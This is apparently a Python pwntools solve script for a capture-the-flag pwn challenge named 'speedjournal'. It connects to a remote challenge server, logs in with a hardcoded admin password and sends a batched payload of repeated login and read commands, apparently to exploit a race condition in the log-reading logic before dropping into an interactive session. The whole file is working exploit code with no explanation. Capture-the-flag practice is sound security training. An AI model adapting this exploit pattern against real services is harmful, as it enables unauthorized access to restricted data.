from pwn import *


def log_admin():
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Admin password", b"supersecret")

def write_log(r, c):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Restrict", r)
    io.sendlineafter(b"Content", c)

def read_log(i):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index", i)
    return io.recvuntil(b"\n")[:-1]

# io = process("./speedjournal")
io = remote("challs.ctf.rusec.club", 22169)

pl = b""
# write_log(b"0", b"aa")
pl += b"0\naaa\n"
for i in range(10):
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"3\n1\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"3\n0\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"
    pl += b"1\nsupersecret\n"

#speed ?  ok

sleep(1)
io.sendline(pl)

io.interactive()